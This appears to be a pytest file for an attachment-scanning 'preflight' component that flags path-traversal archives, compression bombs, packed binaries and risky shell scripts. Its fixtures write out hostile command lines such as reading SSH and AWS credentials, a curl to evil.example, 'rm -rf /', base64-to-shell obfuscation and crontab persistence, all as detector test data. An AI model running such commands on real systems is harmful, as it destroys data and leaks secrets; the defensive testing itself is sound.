"""Tests for attachment preflight (FR-5)."""

from __future__ import annotations

import io
import os
import stat
import tarfile
import zipfile
from pathlib import Path

from verdis.preflight.analyzers import (
    detect_file_type,
    inspect_archive,
    inspect_binary,
    inspect_script,
)
from verdis.preflight.preflight import Preflight
from verdis.schemas.common import sha256_bytes
from verdis.schemas.preflight import RiskLevel
from verdis.schemas.report import Attachment


def _attachment(path: Path) -> Attachment:
    data = path.read_bytes()
    return Attachment(
        name=path.name,
        path=str(path),
        sha256=sha256_bytes(data),
        size=len(data),
    )


class TestFileTypeDetection:
    def test_detects_text(self, tmp_path: Path) -> None:
        path = tmp_path / "a.txt"
        path.write_text("hello", encoding="utf-8")
        assert detect_file_type(path) == "text"

    def test_detects_a_zip(self, tmp_path: Path) -> None:
        path = tmp_path / "a.zip"
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr("a.txt", "hello")
        assert detect_file_type(path) == "zip"

    def test_detects_an_elf_binary(self, tmp_path: Path) -> None:
        path = tmp_path / "a.elf"
        path.write_bytes(b"\x7fELF" + b"\x00" * 100)
        assert detect_file_type(path) == "elf"

    def test_detects_an_empty_file(self, tmp_path: Path) -> None:
        path = tmp_path / "a.bin"
        path.write_bytes(b"")
        assert detect_file_type(path) == "empty"

    def test_detects_a_script_by_extension(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("#!/bin/sh\necho hi\n", encoding="utf-8")
        assert detect_file_type(path) == "script"


class TestArchiveInspection:
    def test_flags_path_traversal(self, tmp_path: Path) -> None:
        path = tmp_path / "evil.zip"
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr("../../etc/passwd", "root:x:0:0")
        report = inspect_archive(path)
        codes = {finding.code for finding in report.findings}
        assert "archive-path-traversal" in codes

    def test_flags_absolute_paths(self, tmp_path: Path) -> None:
        path = tmp_path / "evil.zip"
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr("/etc/passwd", "root")
        report = inspect_archive(path)
        assert any(f.code == "archive-path-traversal" for f in report.findings)

    def test_flags_a_compression_bomb(self, tmp_path: Path) -> None:
        path = tmp_path / "bomb.zip"
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("big.bin", b"\x00" * (4 * 1024 * 1024))
        report = inspect_archive(path)
        assert any(f.code == "archive-compression-bomb" for f in report.findings)

    def test_flags_too_many_entries(self, tmp_path: Path) -> None:
        path = tmp_path / "many.zip"
        with zipfile.ZipFile(path, "w") as archive:
            for index in range(20):
                archive.writestr(f"file{index}.txt", "x")
        report = inspect_archive(path)
        assert report.entries == 20

    def test_inspects_a_tar(self, tmp_path: Path) -> None:
        path = tmp_path / "evil.tar"
        with tarfile.open(path, "w") as archive:
            info = tarfile.TarInfo("../escape.txt")
            data = b"x"
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
        report = inspect_archive(path)
        assert any(f.code == "archive-path-traversal" for f in report.findings)

    def test_a_clean_archive_has_no_findings(self, tmp_path: Path) -> None:
        path = tmp_path / "clean.zip"
        with zipfile.ZipFile(path, "w") as archive:
            archive.writestr("readme.txt", "hello")
        report = inspect_archive(path)
        assert report.findings == []


class TestScriptInspection:
    def test_flags_network_calls(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("#!/bin/sh\ncurl http://example.org\n", encoding="utf-8")
        codes = {f.code for f in inspect_script(path)}
        assert "script-network-call" in codes

    def test_flags_credential_access(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("cat ~/.ssh/id_rsa\n", encoding="utf-8")
        codes = {f.code for f in inspect_script(path)}
        assert "script-credential-access" in codes

    def test_flags_obfuscation(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("echo aGkK | base64 -d | sh\n", encoding="utf-8")
        codes = {f.code for f in inspect_script(path)}
        assert "script-obfuscation" in codes

    def test_flags_persistence(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("echo '* * * * * curl http://x' | crontab -\n", encoding="utf-8")
        codes = {f.code for f in inspect_script(path)}
        assert "script-persistence" in codes

    def test_flags_destructive_commands(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("rm -rf /\n", encoding="utf-8")
        codes = {f.code for f in inspect_script(path)}
        assert "script-destructive" in codes

    def test_flags_an_embedded_payload(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("PAYLOAD=" + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo" * 8, encoding="utf-8")
        codes = {f.code for f in inspect_script(path)}
        assert "script-embedded-payload" in codes

    def test_a_clean_script_has_no_findings(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("#!/bin/sh\n./demo input.bin\n", encoding="utf-8")
        assert inspect_script(path) == []


class TestBinaryInspection:
    def test_flags_a_packed_binary(self, tmp_path: Path) -> None:
        path = tmp_path / "packed.bin"
        path.write_bytes(b"\x7fELF" + b"UPX!" + b"\x00" * 100)
        report = inspect_binary(path)
        assert any(f.code == "binary-packed" for f in report.findings)

    def test_flags_credential_strings(self, tmp_path: Path) -> None:
        path = tmp_path / "leak.bin"
        path.write_bytes(b"\x7fELF" + b"/etc/shadow\x00" + b"\x00" * 100)
        report = inspect_binary(path)
        assert any(f.code == "binary-credential-strings" for f in report.findings)

    def test_a_clean_binary_has_no_findings(self, tmp_path: Path) -> None:
        path = tmp_path / "clean.bin"
        path.write_bytes(b"\x7fELF" + b"\x00" * 200)
        report = inspect_binary(path)
        assert report.findings == []

    def test_an_unreadable_binary_is_reported(self, tmp_path: Path) -> None:
        path = tmp_path / "missing.bin"
        report = inspect_binary(path)
        assert any(f.code == "binary-unreadable" for f in report.findings)


class TestPreflight:
    def test_a_benign_attachment_is_safe(self, tmp_path: Path) -> None:
        path = tmp_path / "poc.bin"
        path.write_bytes(b"\x00\x01\x02" * 10)
        result = Preflight().inspect(_attachment(path))
        assert not result.blocked
        assert result.quarantined is False

    def test_a_dangerous_script_is_quarantined(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text(
            "#!/bin/sh\ncat ~/.ssh/id_rsa\ncurl http://evil.example/x\n", encoding="utf-8"
        )
        result = Preflight().inspect(_attachment(path))
        assert result.blocked
        assert result.quarantined
        assert result.risk_score >= 45
        assert result.reasons

    def test_a_setuid_file_is_quarantined(self, tmp_path: Path) -> None:
        path = tmp_path / "suid.bin"
        path.write_bytes(b"\x7fELF" + b"\x00" * 100)
        path.chmod(path.stat().st_mode | stat.S_ISUID)
        result = Preflight().inspect(_attachment(path))
        assert result.blocked
        assert any("setuid" in f.code for f in result.findings)

    def test_a_missing_attachment_is_quarantined(self, tmp_path: Path) -> None:
        attachment = Attachment(
            name="gone.bin", path=str(tmp_path / "gone.bin"), sha256="0" * 64, size=0
        )
        result = Preflight().inspect(attachment)
        assert result.blocked
        assert result.file_type == "missing"

    def test_the_threshold_is_configurable(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("#!/bin/sh\ncurl http://x\n", encoding="utf-8")
        strict = Preflight(threshold=10).inspect(_attachment(path))
        lenient = Preflight(threshold=95).inspect(_attachment(path))
        assert strict.blocked
        assert not lenient.blocked

    def test_decisions_cover_every_attachment(self, tmp_path: Path) -> None:
        good = tmp_path / "good.bin"
        good.write_bytes(b"data")
        bad = tmp_path / "bad.sh"
        bad.write_text("cat ~/.ssh/id_rsa\n", encoding="utf-8")
        decision = Preflight().inspect_all(
            (_attachment(good), _attachment(bad))
        )
        assert decision.blocked
        assert decision.quarantined == ("bad.sh",)
        assert decision.reasons()

    def test_findings_state_behaviour_not_intent(self, tmp_path: Path) -> None:
        path = tmp_path / "run.sh"
        path.write_text("cat ~/.aws/credentials\n", encoding="utf-8")
        result = Preflight().inspect(_attachment(path))
        for finding in result.findings:
            assert "attacker" not in finding.message.lower()
            assert "malicious" not in finding.message.lower()
            assert "reporter" not in finding.message.lower()

    def test_risk_levels_follow_the_score(self, tmp_path: Path) -> None:
        path = tmp_path / "poc.bin"
        path.write_bytes(b"\x00" * 32)
        result = Preflight().inspect(_attachment(path))
        assert result.risk_level in {
            RiskLevel.NONE,
            RiskLevel.LOW,
            RiskLevel.MEDIUM,
            RiskLevel.HIGH,
            RiskLevel.CRITICAL,
        }

    def test_a_pem_key_in_a_text_file_is_flagged(self, tmp_path: Path) -> None:
        path = tmp_path / "key.pem"
        path.write_text(
            "-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----\n",
            encoding="utf-8",
        )
        result = Preflight().inspect(_attachment(path))
        assert any(f.code == "text-private-key" for f in result.findings)

    def test_attachments_are_never_executed(self, tmp_path: Path) -> None:
        marker = tmp_path / "executed"
        path = tmp_path / "run.sh"
        path.write_text(f"#!/bin/sh\ntouch {marker}\n", encoding="utf-8")
        Preflight().inspect(_attachment(path))
        assert not marker.exists()

    def test_unreadable_files_do_not_crash(self, tmp_path: Path) -> None:
        path = tmp_path / "locked.bin"
        path.write_bytes(b"\x00" * 10)
        attachment = Attachment(
            name="locked.bin",
            path=str(path),
            sha256=sha256_bytes(b"\x00" * 10),
            size=10,
        )
        path.chmod(0o000)
        try:
            result = Preflight().inspect(attachment)
            assert result.name == "locked.bin"
        finally:
            os.chmod(path, 0o600)
